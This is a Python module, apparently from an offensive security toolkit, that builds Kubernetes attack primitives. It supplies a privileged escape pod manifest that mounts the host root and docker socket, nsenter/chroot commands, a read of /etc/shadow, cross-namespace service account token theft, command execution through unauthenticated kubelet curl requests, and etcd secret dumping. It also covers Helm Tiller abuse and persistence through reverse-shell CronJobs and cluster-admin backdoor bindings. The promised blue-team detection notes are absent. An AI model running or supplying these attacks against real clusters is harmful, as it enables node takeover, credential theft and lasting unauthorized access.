"""Kubernetes attack module — RBAC enumeration, pod escape, etcd access, Helm abuse.

Provides attack primitives for Kubernetes clusters: RBAC privilege
enumeration, pod escape techniques (privileged containers, hostPath,
hostNetwork, hostPID), etcd database access, Helm Tiller exploitation,
kubelet anonymous auth abuse, service account token theft across
namespaces, and admission controller bypass.

All techniques are organized by threat matrix category with detection
notes for blue team awareness.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any

K8S_PRIVESC_METHODS = [
    "privileged_pod",
    "hostpath_mount",
    "hostnetwork_access",
    "hostpid_namespace",
    "hostipc_namespace",
    "nsenter_escape",
    "cgroup_escape",
    "docker_socket_mount",
    "kubelet_anonymous_auth",
    "etcd_access",
    "helm_tiller_abuse",
    "serviceaccount_token_theft",
    "clusterrolebinding_create",
    "admission_controller_bypass",
    "kubeconfig_theft",
    "webhook_injection",
    "cronjob_persistence",
    "daemonset_backdoor",
    "secret_enumeration",
    "pod_create_impersonation",
]

K8S_SENSITIVE_CAPABILITIES = [
    "SYS_ADMIN",
    "SYS_PTRACE",
    "SYS_MODULE",
    "DAC_OVERRIDE",
    "NET_ADMIN",
    "NET_RAW",
    "IPC_LOCK",
    "CAP_SYS_ADMIN",
    "CAP_SYS_PTRACE",
    "CAP_NET_ADMIN",
    "ALL",
]


@dataclass
class K8sConfig:
    """Configuration for Kubernetes attack operations.

    Attributes:
        cluster_url: Kubernetes API server URL.
        kubeconfig_path: Path to kubeconfig file.
        namespace: Target namespace.
        pod_name: Target pod name.
        token: Service account token.
        certificate_authority: CA certificate for verification.
    """

    cluster_url: str = ""
    kubeconfig_path: str = ""
    namespace: str = "default"
    pod_name: str = ""
    token: str = ""
    certificate_authority: str = ""


class K8SAttackEngine:
    """Execute Kubernetes privilege escalation and enumeration attacks.

    Provides RBAC enumeration, pod escape vectors, etcd exploitation,
    and service account token abuse across namespaces.

    Attributes:
        config: K8sConfig with cluster and auth details.
    """

    def __init__(self, config: K8sConfig | None = None):
        self.config = config or K8sConfig()

    def enumerate_rbac(self) -> dict[str, Any]:
        """Enumerate RBAC permissions for the current identity.

        Maps ClusterRoles, Roles, RoleBindings, and ClusterRoleBindings
        to identify privilege escalation paths.

        Returns:
            Dict with RBAC enumeration commands and findings.
        """
        return {
            "attack_type": "rbac_enumeration",
            "commands": [
                "kubectl auth can-i --list",
                "kubectl get clusterroles,roles --all-namespaces",
                "kubectl get clusterrolebindings,rolebindings --all-namespaces",
                "kubectl api-resources --verbs=list --namespaced -o name",
                "kubectl get pods,services,deployments,secrets,configmaps --all-namespaces",
            ],
            "privesc_checks": {
                "create pods": "Can create privileged pods with host mounts",
                "create clusterrolebindings": "Can bind self to cluster-admin",
                "get secrets": "Can read service account tokens from any namespace",
                "impersonate users/groups": "Can impersonate cluster-admin",
                "escalate roles": "Can create Roles with higher privileges",
                "create validatingwebhookconfigurations": "Can inject webhooks to intercept API calls",
            },
        }

    def privileged_pod_escape(self) -> dict[str, Any]:
        """Plan a privileged pod escape.

        If the user can create pods with privileged:true, hostPath mounts,
        hostPID, or hostNetwork, they can escape to the underlying node.

        Returns:
            Dict with pod manifest and escape commands.
        """
        privileged_pod_yaml = {
            "apiVersion": "v1",
            "kind": "Pod",
            "metadata": {"name": "lazyown-escape", "namespace": self.config.namespace},
            "spec": {
                "hostPID": True,
                "hostNetwork": True,
                "hostIPC": True,
                "containers": [
                    {
                        "name": "escape",
                        "image": "ubuntu:latest",
                        "command": ["/bin/bash", "-c", "sleep 3600"],
                        "securityContext": {
                            "privileged": True,
                            "capabilities": {"add": ["SYS_ADMIN", "SYS_PTRACE", "NET_ADMIN"]},
                        },
                        "volumeMounts": [
                            {"name": "host-root", "mountPath": "/host"},
                            {"name": "docker-socket", "mountPath": "/var/run/docker.sock"},
                        ],
                    }
                ],
                "volumes": [
                    {"name": "host-root", "hostPath": {"path": "/", "type": "Directory"}},
                    {"name": "docker-socket", "hostPath": {"path": "/var/run/docker.sock"}},
                ],
            },
        }

        return {
            "attack_type": "privileged_pod_escape",
            "requirements": ["create pods + privileged:true OR hostPath mount"],
            "pod_manifest": privileged_pod_yaml,
            "commands": [
                "kubectl apply -f escape-pod.yaml",
                "kubectl exec -it lazyown-escape -- /bin/bash",
                "# Inside the pod:",
                "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash",
                "chroot /host /bin/bash",
                "cat /host/etc/shadow",
                "# Via docker socket:",
                "docker -H unix:///var/run/docker.sock run -it -v /:/host ubuntu chroot /host /bin/bash",
            ],
        }

    def service_account_token_theft(self) -> dict[str, Any]:
        """Steal service account tokens across namespaces for lateral movement.

        If the attacker has list/get secrets access, they can extract
        service account tokens from any namespace.

        Returns:
            Dict with token theft techniques.
        """
        return {
            "attack_type": "sa_token_theft",
            "requirements": ["get secrets OR list secrets across namespaces"],
            "default_token_paths": [
                "/var/run/secrets/kubernetes.io/serviceaccount/token",
                "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
                "/run/secrets/kubernetes.io/serviceaccount/token",
            ],
            "commands": [
                "kubectl get secrets --all-namespaces",
                "kubectl get secret SA_TOKEN_SECRET -n NAMESPACE -o jsonpath='{.data.token}' | base64 -d",
                "kubectl get secret SA_TOKEN_SECRET -n NAMESPACE -o jsonpath='{.data.ca\\.crt}' | base64 -d > ca.crt",
                "kubectl --token=STOLEN_TOKEN --certificate-authority=ca.crt --server=https://KUBE_API get pods --all-namespaces",
            ],
        }

    def kubelet_anonymous_auth_abuse(self) -> dict[str, Any]:
        """Exploit kubelet anonymous authentication.

        If the kubelet has anonymous access enabled (--anonymous-auth=true),
        attackers can execute commands on pods and nodes directly.

        Returns:
            Dict with kubelet exploitation commands.
        """
        return {
            "attack_type": "kubelet_anonymous_auth",
            "requirements": ["Kubelet --anonymous-auth=true (default in some setups)"],
            "kubelet_port": 10250,
            "commands": [
                "curl -sk https://NODE_IP:10250/pods",
                "curl -sk https://NODE_IP:10250/runningpods/",
                "curl -sk -X POST https://NODE_IP:10250/run/NAMESPACE/POD_NAME/CONTAINER -d 'cmd=id'",
                "curl -sk https://NODE_IP:10250/metrics",
                "# Discover kubelets:",
                "kubectl get nodes -o jsonpath='{.items[*].status.addresses[?(@.type==\"InternalIP\")].address}'",
            ],
            "impact": "Execute commands in any pod on the node without authentication",
        }

    def etcd_access_exploitation(self) -> dict[str, Any]:
        """Exploit etcd database access for complete cluster compromise.

        etcd stores all Kubernetes objects including Secrets, ServiceAccount
        tokens, and certificates. Direct etcd access bypasses all RBAC.

        Returns:
            Dict with etcd exploitation commands.
        """
        return {
            "attack_type": "etcd_exploitation",
            "requirements": ["Network access to etcd (port 2379)", "etcd client certificate (or anonymous)"],
            "default_etcd_args": [
                "--endpoints=https://127.0.0.1:2379",
                "--cert=/etc/kubernetes/pki/etcd/server.crt",
                "--key=/etc/kubernetes/pki/etcd/server.key",
                "--cacert=/etc/kubernetes/pki/etcd/ca.crt",
            ],
            "commands": [
                "ETCDCTL_API=3 etcdctl --endpoints=https://127.0.0.1:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key get / --prefix --keys-only",
                "ETCDCTL_API=3 etcdctl get /registry/secrets/NAMESPACE/SECRET_NAME",
                "ETCDCTL_API=3 etcdctl get /registry/serviceaccounts/ --prefix --keys-only",
            ],
            "extract_token_script": (
                "ETCDCTL_API=3 etcdctl get /registry/secrets/ --prefix | "
                "grep -a 'token' | base64 -d"
            ),
        }

    def helm_tiller_abuse(self) -> dict[str, Any]:
        """Abuse Helm (v2 Tiller or v3 RBAC) for privilege escalation.

        Helm v2's Tiller component runs with cluster-admin by default.
        Helm v3 uses the user's kubeconfig but still needs extensive RBAC.

        Returns:
            Dict with Helm abuse techniques.
        """
        return {
            "attack_type": "helm_tiller_abuse",
            "tiller_v2": {
                "port": 44134,
                "description": "Tiller (v2) runs with cluster-admin and has no authentication",
                "commands": [
                    "helm --host tiller-deploy.kube-system:44134 ls --all",
                    "helm --host tiller-deploy.kube-system:44134 install --name privesc ./chart",
                ],
            },
            "v3_abuse": {
                "description": "Helm v3 executes with user RBAC but charts can request elevated perms",
                "commands": [
                    "helm install privesc ./chart --namespace kube-system --create-namespace",
                    "# Chart deploys privileged pod or ClusterRoleBinding",
                ],
            },
        }

    def persistence_techniques(self) -> dict[str, Any]:
        """Kubernetes persistence techniques for long-term access.

        Returns:
            Dict with persistence methods and their manifests.
        """
        return {
            "attack_type": "k8s_persistence",
            "techniques": [
                {
                    "name": "CronJob",
                    "description": "Create a CronJob that runs a reverse shell periodically",
                    "api_resource": "batch/v1 CronJob",
                    "trigger": "Every 5 minutes",
                },
                {
                    "name": "DaemonSet",
                    "description": "Deploy a DaemonSet that runs on every node",
                    "api_resource": "apps/v1 DaemonSet",
                    "trigger": "On every node at deployment time",
                },
                {
                    "name": "Webhook Injection",
                    "description": "Modify a ValidatingWebhookConfiguration to intercept pod creations",
                    "api_resource": "admissionregistration.k8s.io/v1 ValidatingWebhookConfiguration",
                    "trigger": "On every new pod creation",
                },
                {
                    "name": "ServiceAccount Token",
                    "description": "Create a long-lived service account token Secret",
                    "api_resource": "v1 Secret (type: kubernetes.io/service-account-token)",
                },
                {
                    "name": "ClusterRoleBinding",
                    "description": "Bind a backdoor service account to cluster-admin",
                    "api_resource": "rbac.authorization.k8s.io/v1 ClusterRoleBinding",
                },
            ],
        }

    def summary(self) -> dict[str, Any]:
        return {
            "available_attacks": K8S_PRIVESC_METHODS[:16],
            "sensitive_capabilities": K8S_SENSITIVE_CAPABILITIES[:8],
            "namespace": self.config.namespace,
            "quick_enum": [
                "kubectl auth can-i --list",
                "kubectl get nodes,pods,services,secrets --all-namespaces",
                "kubectl cluster-info dump",
                "kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects != null)'",
            ],
        }
